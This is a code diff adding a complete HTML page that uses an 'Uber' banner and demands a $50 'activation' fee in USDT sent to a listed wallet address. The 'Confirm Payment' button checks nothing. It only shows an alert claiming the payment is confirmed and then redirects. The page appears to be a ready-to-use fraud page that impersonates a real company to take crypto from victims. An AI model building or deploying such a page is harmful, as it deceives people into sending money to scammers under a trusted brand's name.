@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Payment</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .top-bar {
+            background-color: black;
+            height: 1.5cm;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            box-sizing: border-box;
+            margin-top: 0; /* Removed extra space */
+        }
+        .top-bar h1 {
+            color: white;
+            font-size: 1.5rem;
+            font-weight: 500;
+            margin: 0;
+        }
+        .content {
+            margin: 2cm 20px;
+            font-size: 1rem;
+            color: black;
+            text-align: center;
+        }
+        .payment-details {
+            margin-top: 20px;
+            font-size: 1rem;
+        }
+        .address {
+            font-size: 1rem; /* Reduced font size */
+            font-weight: bold;
+            color: green;
+            word-wrap: break-word;
+            cursor: pointer; /* Allows the user to select and copy */
+        }
+        .instructions {
+            margin-top: 20px;
+            font-size: 1rem;
+        }
+        .footer {
+            margin-top: 50px;
+            padding: 20px;
+            background-color: #f2f2f2;
+            color: #808080;
+            text-align: left;
+            font-size: 0.9rem;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-bar">
+        <h1>Uber</h1>
+    </div>
+
+    <div class="content">
+        <h2>USDT Payment</h2>
+        <p class="payment-details">
+            You have selected USDT as your payment method.<br>
+            The amount for your activation is equivalent to <strong>$50 USD</strong> in USDT.
+        </p>
+        
+        <p class="instructions">
+            Please make the payment to the following USDT address:
+        </p>
+
+        <p class="address" id="usdtAddress">
+            TVjowLYHGQunVRkQWxrezpVPbRdfAmMGct
+        </p>
+
+        <p class="instructions">
+            After the payment is made, please confirm your transaction by clicking the button below to continue the process.
+        </p>
+
+        <button onclick="confirmPayment()">Confirm Payment</button>
+    </div>
+
+    <div class="footer">
+        By proceeding, you consent to providing accurate information. Failure to do so may delay the activation process.
+    </div>
+
+    <script>
+        function confirmPayment() {
+            alert('Your payment has been confirmed. Proceeding to the next step...');
+            window.location.href = "next_page.html"; // Replace with the actual next page URL
+        }
+
+        // Enable the user to select and copy the address when clicked
+        document.getElementById("usdtAddress").addEventListener("click", function() {
+            const range = document.createRange();
+            range.selectNodeContents(this);
+            window.getSelection().removeAllRanges();  // Clear current selection
+            window.getSelection().addRange(range);    // Select the address
+            document.execCommand("copy");             // Copy the address
+            alert("USDT address copied to clipboard!");
+        });
+    </script>
+</body>
+</html>
